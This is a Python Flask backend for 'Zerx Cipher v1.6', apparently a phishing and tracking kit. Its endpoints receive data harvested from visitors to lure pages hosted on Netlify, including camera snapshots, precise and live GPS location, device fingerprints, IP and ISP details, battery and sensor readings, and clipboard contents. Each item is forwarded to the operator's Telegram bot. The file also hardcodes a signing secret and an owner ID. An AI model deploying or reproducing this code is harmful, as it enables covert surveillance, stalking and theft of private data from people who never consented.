#!/usr/bin/env python3
# server.py — Flask backend for Zerx Cipher v1.6
# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store,
#            /api/preview-store, /preview/<slug>,
#            /track, /track-camera, /track-chunk, /health

from flask import Flask, request, jsonify, Response
import hmac, hashlib, time, sqlite3, os, json, base64
from datetime import datetime, timezone

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50MB for camera payloads

LINK_SECRET = os.environ.get("LINK_SECRET", "zE4o-jRvHuJiSbw-bg72aeygBJ-In52YqBj_oV-PuYoYlmrIhf_jhjzThgCmShLt")
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
DIVIDER     = "━━━━━━━━━━━━━━━━"
FOOTER      = "⚡ Developed by: @zerxofficial"

_CLONES = {}
_PREVIEWS = {}
_LAST_EVENT = {}
_CHUNKS = {}

ALLOWED_ORIGINS = {
    "https://best-free-ai-tool.netlify.app",
    "https://best-free-ai-tools.netlify.app",
    "https://subtle-sunburst-1d934f.netlify.app",
}

@app.after_request
def add_cors(resp):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS or origin.endswith(".netlify.app"):
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        resp.headers["Access-Control-Max-Age"] = "86400"
    return resp

def _sign(payload: str) -> str:
    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]

def _flag_emoji(cc):
    if not cc or len(cc) != 2:
        return ""
    try:
        return chr(0x1F1E6 + ord(cc[0].upper()) - 65) + chr(0x1F1E6 + ord(cc[1].upper()) - 65)
    except Exception:
        return ""

def _send_telegram_text(chat_id, text, reply_markup=None):
    import requests as rq
    try:
        body = {"chat_id": chat_id, "text": text,
                "parse_mode": "HTML", "disable_web_page_preview": True}
        if reply_markup:
            body["reply_markup"] = reply_markup
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json=body,
            timeout=12,
        )
    except Exception as e:
        print(f"telegram text failed: {e}")

def _send_telegram_photo(chat_id, b64_data, caption):
    import requests as rq
    try:
        if "," in b64_data:
            b64_data = b64_data.split(",", 1)[1]
        raw = base64.b64decode(b64_data)
        rq.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            files={"photo": ("capture.jpg", raw)},
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
            timeout=20,
        )
    except Exception as e:
        print(f"telegram photo failed: {e}")

def _reverse_geocode(lat, lon):
    import requests as rq
    try:
        r = rq.get(
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&zoom=18",
            headers={"User-Agent": "ZerxCipher/1.6"},
            timeout=5
        )
        if r.ok:
            d = r.json()
            return d.get("display_name", "")
    except:
        pass
    try:
        r = rq.get(
            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={lat}&longitude={lon}&localityLanguage=en",
            timeout=5
        )
        if r.ok:
            d = r.json()
            ct = d.get("city") or d.get("locality") or ""
            pc = d.get("principalSubdivision") or ""
            co = d.get("countryName") or ""
            if ct or pc or co:
                return f"{ct}, {pc}, {co}".strip(", ")
    except:
        pass
    return ""

def _mark(uid, typ):
    _LAST_EVENT.setdefault(uid, {})[typ] = time.time()

def _recent(uid, typ, window=30):
    last = _LAST_EVENT.get(uid, {})
    return last.get(typ) and (time.time() - last[typ]) < window

# ============================================================
# VERIFY (link tokens)
# ============================================================
@app.route("/api/verify", methods=["GET", "OPTIONS"])
def api_verify():
    if request.method == "OPTIONS":
        return ("", 204)
    uid_s = request.args.get("id", "")
    tok   = request.args.get("t", "")
    if not uid_s.isdigit() or not tok:
        return jsonify({"ok": False, "reason": "missing"}), 403
    uid = int(uid_s)
    try:
        exp_s, sig = tok.split(".", 1)
        exp = int(exp_s)
    except Exception:
        return jsonify({"ok": False, "reason": "malformed"}), 403
    if exp < int(time.time()):
        return jsonify({"ok": False, "reason": "expired"}), 403
    expected = _sign(f"{uid}.{exp}")
    if not hmac.compare_digest(expected, sig):
        return jsonify({"ok": False, "reason": "bad_signature"}), 403
    return jsonify({"ok": True, "uid": uid})

# ============================================================
# CLONE STORE (device monitor / camera / location pages)
# ============================================================
@app.route("/api/clone-store", methods=["POST"])
def clone_store():
    try:
        data = request.get_json(force=True) or {}
        slug = data.get("slug", "")
        html = data.get("html", "")
        if not slug or not html:
            return jsonify({"ok": False}), 400
        _CLONES[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS clone_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO clone_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/clone/<slug>", methods=["GET"])
def api_clone(slug):
    html = _CLONES.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return "Not found", 404

# ============================================================
# PREVIEW STORE (web scrapper mirror)
# ============================================================
@app.route("/api/preview-store", methods=["POST", "OPTIONS"])
def preview_store():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
        slug = (data.get("slug") or "").strip()
        html = data.get("html") or ""
        if not slug or not html:
            return jsonify({"ok": False, "error": "missing slug or html"}), 400
        _PREVIEWS[slug] = html
        try:
            con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
            con.execute("""CREATE TABLE IF NOT EXISTS preview_html(
                             slug TEXT PRIMARY KEY, html TEXT, created TEXT)""")
            con.execute("INSERT OR REPLACE INTO preview_html(slug,html,created) VALUES(?,?,?)",
                        (slug, html, datetime.now(timezone.utc).isoformat()))
            con.commit()
            con.close()
        except Exception:
            pass
        return jsonify({"ok": True, "slug": slug}), 200
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/preview/<slug>", methods=["GET"])
def preview_view(slug):
    html = _PREVIEWS.get(slug)
    if html:
        return Response(html, mimetype="text/html; charset=utf-8")
    try:
        con = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
        con.row_factory = sqlite3.Row
        row = con.execute("SELECT html FROM preview_html WHERE slug=?", (slug,)).fetchone()
        con.close()
        if row:
            return Response(row["html"], mimetype="text/html; charset=utf-8")
    except Exception:
        pass
    return Response(
        "<!doctype html><meta charset='utf-8'><title>Not found</title>"
        "<body style='font:14px -apple-system,Segoe UI,sans-serif;background:#0e0e11;"
        "color:#eee;display:flex;align-items:center;justify-content:center;"
        "height:100vh;margin:0'><div>Preview not found or expired.</div></body>",
        status=404, mimetype="text/html; charset=utf-8"
    )

# ============================================================
# TRACK — Main tracking endpoint (enhanced)
# ============================================================
@app.route("/track", methods=["POST", "OPTIONS"])
def track():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    payload = data.get("data", {}) or {}
    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")

    # ── CAMERA (front/back frames) ──
    if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
        if _recent(uid, "camera", 8):
            return jsonify({"ok": True, "dup": True}), 200
        cam_label = payload.get("camera", "unknown")
        frame_idx = payload.get("frame", 0)
        total_frames = payload.get("total", 1)
        caption = (
            f"📸 <b>Camera Capture</b>\n"
            f"{DIVIDER}\n"
            f"📷 Camera: <b>{cam_label}</b>\n"
            f"🎞 Frame: {frame_idx + 1}/{total_frames}\n"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        _send_telegram_photo(uid, payload["image"], caption)
        _mark(uid, "camera")
        return jsonify({"ok": True}), 200

    # ── PRECISE LOCATION (with reverse geocoding) ──
    if typ == "precise_location" and isinstance(payload, dict):
        if _recent(uid, "precise_location", 15):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        display = payload.get("display", "") or _reverse_geocode(lat, lon)
        road = payload.get("road", "")
        city = payload.get("city", "")
        state = payload.get("state", "")
        postcode = payload.get("postcode", "")
        country = payload.get("country", "")
        maps_url = payload.get("mapsUrl", f"https://maps.google.com/?q={lat},{lon}")
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        addr_parts = [p for p in [road, city, state, postcode, country] if p]
        addr_line = ", ".join(addr_parts) if addr_parts else "N/A"
        text = (
            f"📍 <b>Precise GPS Location</b>\n"
            f"{DIVIDER}\n"
            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
            f"🏠 Address: {addr_line}\n"
            f"🗺 Full: {display[:100] if display else 'N/A'}\n"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        kb = json.dumps({"inline_keyboard": [[{"text": "🗺 View Live Location Maps", "url": maps_url}]]})
        _send_telegram_text(uid, text, reply_markup=kb)
        _mark(uid, "precise_location")
        return jsonify({"ok": True}), 200

    # ── LIVE LOCATION UPDATE (watchPosition) ──
    if typ == "location_update" and isinstance(payload, dict):
        if _recent(uid, "location_update", 45):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        maps = f"https://maps.google.com/?q={lat},{lon}"
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        
        addr = _reverse_geocode(lat, lon)
        addr_line = f"🏠 Address: {addr[:100]}\n" if addr else ""
        
        text = (
            f"📡 <b>Live Location Update</b>\n"
            f"{DIVIDER}\n"
            f"🎯 <code>{lat}, {lon}</code>{acc_line}\n"
            f"{addr_line}"
            f"📅 {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        kb = json.dumps({"inline_keyboard": [[{"text": "🗺 View Live Location Maps", "url": maps}]]})
        _send_telegram_text(uid, text, reply_markup=kb)
        _mark(uid, "location_update")
        return jsonify({"ok": True}), 200

    # ── INITIAL LOCATION ──
    if typ == "location" and isinstance(payload, dict):
        if _recent(uid, "location", 30):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        maps = f"https://maps.google.com/?q={lat},{lon}"
        
        addr = _reverse_geocode(lat, lon)
        addr_line = f"🏠 Address: {addr[:100]}\n" if addr else ""
        
        text = (
            f"📍 <b>Live Location Captured</b>\n"
            f"{DIVIDER}\n"
            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
            f"{addr_line}"
            f"📅 Captured: {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        kb = json.dumps({"inline_keyboard": [[{"text": "🗺 View Live Location Maps", "url": maps}]]})
        _send_telegram_text(uid, text, reply_markup=kb)
        _mark(uid, "location")
        return jsonify({"ok": True}), 200

    # ── HEARTBEAT (periodic, 60s) ──
    if typ == "heartbeat" and isinstance(payload, dict):
        if _recent(uid, "heartbeat", 50):
            return jsonify({"ok": True, "dup": True}), 200
        lat = payload.get("lat")
        lon = payload.get("lon")
        acc = payload.get("acc")
        vis = payload.get("visible", "unknown")
        url = payload.get("url", "n/a")
        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
        maps = f"https://maps.google.com/?q={lat},{lon}"
        
        addr = _reverse_geocode(lat, lon)
        addr_line = f"🏠 Address: {addr[:100]}\n" if addr else ""
        
        text = (
            f"💓 <b>Heartbeat</b>\n"
            f"{DIVIDER}\n"
            f"📍 <code>{lat}, {lon}</code>{acc_line}\n"
            f"{addr_line}"
            f"👁 Page: {vis}\n"
            f"📄 {url}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n"
            f"{FOOTER}"
        )
        kb = json.dumps({"inline_keyboard": [[{"text": "🗺 View Live Location Maps", "url": maps}]]})
        _send_telegram_text(uid, text, reply_markup=kb)
        _mark(uid, "heartbeat")
        return jsonify({"ok": True}), 200

    # ── DEVICE INFO (enhanced with fingerprints) ──
    if typ == "device_info" and isinstance(payload, dict):
        if _recent(uid, "device_info", 60):
            return jsonify({"ok": True, "dup": True}), 200

        ua = payload.get("ua", "N/A")
        platform = payload.get("platform", "N/A")
        lang = payload.get("lang", "N/A")
        langs = payload.get("langs", "N/A")
        screen_res = payload.get("screen", "N/A")
        avail = payload.get("avail", "N/A")
        color_depth = payload.get("colorDepth", "N/A")
        pixel_ratio = payload.get("pixelRatio", "N/A")
        tz = payload.get("tz", "N/A")
        tz_offset = payload.get("tzOffset", "N/A")
        cores = payload.get("cores", "N/A")
        mem = payload.get("mem", "N/A")
        touch = payload.get("touch", "N/A")
        touch_points = payload.get("touchPoints", "N/A")
        cookies = payload.get("cookies", "N/A")
        dnt = payload.get("dnt", "N/A")
        url = payload.get("url", "N/A")
        referrer = payload.get("referrer", "none")
        webdriver = payload.get("webdriver", False)
        pdf_viewer = payload.get("pdfViewer", False)
        viewport = payload.get("viewport", "N/A")
        online = payload.get("online", "N/A")
        conn_type = payload.get("connectionType", "N/A")

        # Fingerprint data
        canvas_fp = payload.get("canvasFp", "N/A")
        webgl_fp = payload.get("webglFp", {})
        if isinstance(webgl_fp, dict):
            webgl_vendor = webgl_fp.get("vendor", "N/A")
            webgl_renderer = webgl_fp.get("renderer", "N/A")
            webgl_version = webgl_fp.get("version", "N/A")
        else:
            webgl_vendor = webgl_renderer = webgl_version = str(webgl_fp)
        audio_fp = payload.get("audioFp", "N/A")
        fonts = payload.get("fonts", [])
        fonts_str = ", ".join(fonts) if fonts else "none"

        # Network info
        network = payload.get("network") or {}
        net_type = network.get("effectiveType", "N/A") if isinstance(network, dict) else "N/A"
        net_downlink = network.get("downlink", "N/A") if isinstance(network, dict) else "N/A"
        net_rtt = network.get("rtt", "N/A") if isinstance(network, dict) else "N/A"
        net_save = network.get("saveData", "N/A") if isinstance(network, dict) else "N/A"

        # IP data
        ip = payload.get("ip", "Unknown")
        country = payload.get("country", "Unknown")
        cc = payload.get("countryCode", "")
        region = payload.get("region", "Unknown")
        city = payload.get("city", "Unknown")
        zip_code = payload.get("zip", "N/A")
        isp = payload.get("isp", "Unknown")
        org = payload.get("org", "Unknown")
        asn = payload.get("asn", "Unknown")
        ip_tz = payload.get("ipTz", "N/A")
        lat = payload.get("lat", "N/A")
        lon = payload.get("lon", "N/A")
        mobile = payload.get("mobile", "N/A")
        proxy = payload.get("proxy", "N/A")
        hosting = payload.get("hosting", "N/A")
        reverse_geo = payload.get("reverseGeo", "")
        address = payload.get("address", {})

        # Battery
        bat_level = payload.get("batteryLevel", "N/A")
        bat_charge = payload.get("batteryCharging", "N/A")

        # Sensors
        sensors = payload.get("sensors", {})
        sensors_str = json.dumps(sensors)[:100] if sensors else "none"

        text = (
            f"📊 <b>Visitor Information Captured</b>\n"
            f"{DIVIDER}\n\n"
            f"🖥️ <b>Device &amp; Browser</b>\n"
            f"   • Platform: {platform}\n"
            f"   • UA: {ua}\n"
            f"   • Language: {lang} ({langs})\n"
            f"   • Viewport: {viewport}\n"
            f"   • Online: {online}\n"
            f"   • Webdriver: {webdriver}\n"
            f"   • PDF Viewer: {pdf_viewer}\n\n"
            f"🔒 <b>Device Fingerprint</b>\n"
            f"   • Canvas: <code>{canvas_fp}</code>\n"
            f"   • WebGL Vendor: {webgl_vendor}\n"
            f"   • WebGL Renderer: {webgl_renderer}\n"
            f"   • Audio: <code>{audio_fp}</code>\n"
            f"   • Fonts: {fonts_str}\n\n"
            f"🌐 <b>Network Information</b>\n"
            f"   • IP Address: {ip}\n"
            f"   • ISP: {isp}\n"
            f"   • Organization: {org}\n"
            f"   • ASN: {asn}\n"
            f"   • Connection: {net_type}\n"
            f"   • Downlink: {net_downlink}\n"
            f"   • RTT: {net_rtt}\n"
            f"   • Save Data: {net_save}\n\n"
            f"📍 <b>Location Details</b>\n"
            f"   • Country: {country} {_flag_emoji(cc)}\n"
            f"   • Region: {region}\n"
            f"   • City: {city}\n"
            f"   • Zip: {zip_code}\n"
            f"   • Timezone: {tz}\n"
            f"   • IP Timezone: {ip_tz}\n"
            f"   • Lat/Lon: {lat}, {lon}\n"
            f"   • Mobile: {mobile}\n"
            f"   • Proxy: {proxy}\n"
            f"   • Hosting: {hosting}\n"
            f"   • Reverse Geo: {reverse_geo[:80] if reverse_geo else 'N/A'}\n\n"
            f"🖼️ <b>Display Information</b>\n"
            f"   • Resolution: {screen_res}\n"
            f"   • Available: {avail}\n"
            f"   • Color Depth: {color_depth}\n"
            f"   • Pixel Ratio: {pixel_ratio}\n"
            f"   • Touch: {touch} ({touch_points} pts)\n\n"
            f"🔋 <b>Battery Status</b>\n"
            f"   • Level: {bat_level}\n"
            f"   • Charging: {bat_charge}\n\n"
            f"💾 <b>Hardware</b>\n"
            f"   • CPU Cores: {cores}\n"
            f"   • RAM: {mem} GB\n"
            f"   • TZ Offset: {tz_offset}\n\n"
            f"🧭 <b>Sensors</b>\n"
            f"   • {sensors_str}\n\n"
            f"⚙️ <b>Other</b>\n"
            f"   • Cookies: {cookies}\n"
            f"   • DNT: {dnt}\n"
            f"   • Referrer: {referrer}\n"
            f"   • Page URL: {url}\n\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "device_info")
        return jsonify({"ok": True}), 200

    # ── BATTERY ──
    if typ == "battery" and isinstance(payload, dict):
        if _recent(uid, "battery", 120):
            return jsonify({"ok": True, "dup": True}), 200
        level = payload.get("level", "N/A")
        charging = payload.get("charging", "N/A")
        charge_time = payload.get("chargingTime", "N/A")
        discharge_time = payload.get("dischargingTime", "N/A")
        text = (
            f"🔋 <b>Battery Information</b>\n"
            f"{DIVIDER}\n"
            f"   • Level: {level}\n"
            f"   • Charging: {charging}\n"
            f"   • Charge Time: {charge_time}\n"
            f"   • Discharge Time: {discharge_time}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "battery")
        return jsonify({"ok": True}), 200

    # ── MEDIA DEVICES ──
    if typ == "media_devices" and isinstance(payload, list):
        if _recent(uid, "media_devices", 300):
            return jsonify({"ok": True, "dup": True}), 200
        lines = []
        for d in payload:
            kind = d.get("kind", "?")
            label = d.get("label", "(unlabeled)")
            lines.append(f"   • {kind}: {label}")
        devices_str = "\n".join(lines) if lines else "   • none detected"
        text = (
            f"📱 <b>Media Devices</b>\n"
            f"{DIVIDER}\n"
            f"{devices_str}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "media_devices")
        return jsonify({"ok": True}), 200

    # ── PERMISSIONS ──
    if typ == "permissions" and isinstance(payload, dict):
        if _recent(uid, "permissions", 300):
            return jsonify({"ok": True, "dup": True}), 200
        lines = []
        for k, v in payload.items():
            icon = "✅" if v == "granted" else ("❌" if v == "denied" else "⏳")
            lines.append(f"   • {k}: {icon} {v}")
        perms_str = "\n".join(lines) if lines else "   • none"
        text = (
            f"🔐 <b>Permissions Status</b>\n"
            f"{DIVIDER}\n"
            f"{perms_str}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "permissions")
        return jsonify({"ok": True}), 200

    # ── STORAGE ──
    if typ == "storage" and isinstance(payload, dict):
        if _recent(uid, "storage", 300):
            return jsonify({"ok": True, "dup": True}), 200
        quota = payload.get("quota", "N/A")
        usage = payload.get("usage", "N/A")
        text = (
            f"💾 <b>Storage Estimate</b>\n"
            f"{DIVIDER}\n"
            f"   • Quota: {quota}\n"
            f"   • Usage: {usage}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "storage")
        return jsonify({"ok": True}), 200

    # ── CLIPBOARD ──
    if typ == "clipboard" and isinstance(payload, str):
        if _recent(uid, "clipboard", 60):
            return jsonify({"ok": True, "dup": True}), 200
        clip_text = payload[:500] if payload else "(empty)"
        text = (
            f"📋 <b>Clipboard Content</b>\n"
            f"{DIVIDER}\n"
            f"<code>{clip_text}</code>\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "clipboard")
        return jsonify({"ok": True}), 200

    # ── SENSOR (orientation) ──
    if typ == "sensor" and isinstance(payload, dict):
        if _recent(uid, "sensor", 30):
            return jsonify({"ok": True, "dup": True}), 200
        sensor_type = payload.get("type", "unknown")
        alpha = payload.get("alpha", "N/A")
        beta = payload.get("beta", "N/A")
        gamma = payload.get("gamma", "N/A")
        text = (
            f"🧭 <b>Sensor Data — {sensor_type}</b>\n"
            f"{DIVIDER}\n"
            f"   • Alpha: {alpha}\n"
            f"   • Beta: {beta}\n"
            f"   • Gamma: {gamma}\n"
            f"📅 {now}\n"
            f"{DIVIDER}\n{FOOTER}"
        )
        _send_telegram_text(uid, text)
        _mark(uid, "sensor")
        return jsonify({"ok": True}), 200

    # ── GENERIC FALLBACK ──
    text = (
        f"📡 <b>{typ}</b>\n"
        f"{DIVIDER}\n"
        f"<code>{json.dumps(payload)[:900]}</code>\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n"
        f"{FOOTER}"
    )
    _send_telegram_text(uid, text)
    return jsonify({"ok": True}), 200

# ============================================================
# TRACK-CAMERA — Dedicated endpoint for large camera payloads
# ============================================================
@app.route("/track-camera", methods=["POST", "OPTIONS"])
def track_camera():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    b64_image = data.get("image", "")
    if not uid.isdigit() or not b64_image:
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    if _recent(uid, "track_camera", 5):
        return jsonify({"ok": True, "dup": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
    caption = (
        f"📸 <b>Camera Capture (Direct)</b>\n"
        f"{DIVIDER}\n"
        f"📅 Captured: {now}\n"
        f"{DIVIDER}\n"
        f"{FOOTER}"
    )
    _send_telegram_photo(uid, b64_image, caption)
    _mark(uid, "track_camera")
    return jsonify({"ok": True}), 200

# ============================================================
# TRACK-CHUNK — Reassemble chunked large payloads
# ============================================================
@app.route("/track-chunk", methods=["POST", "OPTIONS"])
def track_chunk():
    if request.method == "OPTIONS":
        return ("", 204)
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}

    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    chunk_idx = data.get("chunk", 0)
    total = data.get("total", 1)
    chunk_data = data.get("data", "")

    if not uid.isdigit() or not chunk_data:
        return jsonify({"ok": False}), 400

    # Store chunk
    chunk_key = f"{uid}_{typ}"
    if chunk_idx == 0:
        _CHUNKS[chunk_key] = {"total": total, "parts": {}}
    if chunk_key not in _CHUNKS:
        _CHUNKS[chunk_key] = {"total": total, "parts": {}}
    _CHUNKS[chunk_key]["parts"][chunk_idx] = chunk_data

    # Check if all chunks received
    received = len(_CHUNKS[chunk_key]["parts"])
    if received < total:
        return jsonify({"ok": True, "complete": False, "received": received, "total": total}), 200

    # Reassemble
    full_str = ""
    for i in range(total):
        full_str += _CHUNKS[chunk_key]["parts"].get(i, "")

    # Clean up
    del _CHUNKS[chunk_key]

    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200

    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")

    # If it's a camera image, send as photo
    if typ == "camera":
        try:
            payload = json.loads(full_str)
            if isinstance(payload, dict) and payload.get("image"):
                cam_label = payload.get("camera", "unknown")
                caption = (
                    f"📸 <b>Camera Capture (Chunked)</b>\n"
                    f"{DIVIDER}\n"
                    f"📷 Camera: <b>{cam_label}</b>\n"
                    f"📅 Captured: {now}\n"
                    f"{DIVIDER}\n"
                    f"{FOOTER}"
                )
                _send_telegram_photo(uid, payload["image"], caption)
                return jsonify({"ok": True, "complete": True}), 200
        except Exception:
            pass

    # Otherwise send as text (truncated)
    text = (
        f"📦 <b>{typ} (reassembled)</b>\n"
        f"{DIVIDER}\n"
        f"<code>{full_str[:3500]}</code>\n"
        f"📅 {now}\n"
        f"{DIVIDER}\n"
        f"{FOOTER}"
    )
    _send_telegram_text(uid, text)
    return jsonify({"ok": True, "complete": True}), 200

# ============================================================
# HEALTH
# ============================================================
@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "ok": True,
        "ts": datetime.now(timezone.utc).isoformat(),
        "version": "1.6.0",
        "endpoints": ["/api/verify", "/api/clone-store", "/api/clone/<slug>",
                      "/api/preview-store", "/preview/<slug>",
                      "/track", "/track-camera", "/track-chunk", "/health"]
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
